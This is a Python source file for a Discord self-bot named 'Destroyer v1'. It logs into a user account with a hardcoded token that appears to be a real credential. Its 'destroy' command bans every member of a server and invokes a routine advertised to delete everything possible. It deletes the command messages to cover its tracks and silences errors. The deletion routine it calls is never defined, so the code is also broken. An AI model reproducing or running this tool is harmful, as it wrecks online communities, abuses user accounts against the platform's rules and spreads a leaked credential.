token = "ODA2NjE2MzYxNjM5MDg0MDYz.YJXc4g.8Oi1IMsU23AzUVThw2Y2JFbV00M" # refer to main branch
prefix = "~" 

import discord
from discord.ext import commands
from time import sleep
from tqdm import tqdm
print('\033c')
print("Loading Destroyer v1...")
for i in tqdm(range(10)):
    sleep(0.1)

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents, help_command=None, self_bot=True)
# Construct an instance of commands.Bot

@bot.event
async def on_command_error(ctx, error):
    pass

@bot.check
async def command_invoke_delete(ctx):
    try:
        await ctx.message.delete()
    except discord.Forbidden:
        # lol this should never happen
        pass
    finally:
        return True

@bot.event
async def on_ready():
    print('\033c')
    print("""
 ▄▀▀█▄▄   ▄▀▀█▄▄▄▄  ▄▀▀▀▀▄  ▄▀▀▀█▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄ ▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄     
█ ▄▀   █ ▐  ▄▀   ▐ █ █   ▐ █    █  ▐ █   █   █ █      █ █   ▀▄ ▄▀ ▐  ▄▀   ▐ █   █   █     
▐ █    █   █▄▄▄▄▄     ▀▄   ▐   █     ▐  █▀▀█▀  █      █ ▐     █     █▄▄▄▄▄  ▐  █▀▀█▀      
  █    █   █    ▌  ▀▄   █     █       ▄▀    █  ▀▄    ▄▀       █     █    ▌   ▄▀    █      
 ▄▀▄▄▄▄▀  ▄▀▄▄▄▄    █▀▀▀    ▄▀       █     █     ▀▀▀▀       ▄▀     ▄▀▄▄▄▄   █     █       
█     ▐   █    ▐    ▐      █         ▐     ▐                █      █    ▐   ▐     ▐       
▐         ▐                ▐                                ▐      ▐                 

Original Code By: Da532
Adapted by: xEn0s


[Bot Prefix]: '~'


[Commands]:
--------------------------------------
[destroy] - deletes everything
possible, then bans every member in the server as long as you have permission.
--------------------------------------
""")
print("[DESTROYER V1 IS READY FOR USE.]")

@bot.command()
async def destroy(ctx):

    for member in ctx.guild.members:

        if member == bot.user:
            continue

        try:
            await member.ban()
        except discord.Forbidden:
            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
        else:
            print(f"{member.name} has been banned from {ctx.guild.name}")

    await all(ctx)

    print("Action Completed: destroy")
try:
    bot.run(token, bot=False)
except discord.LoginFailure:
    print('Invalid Token Passed')
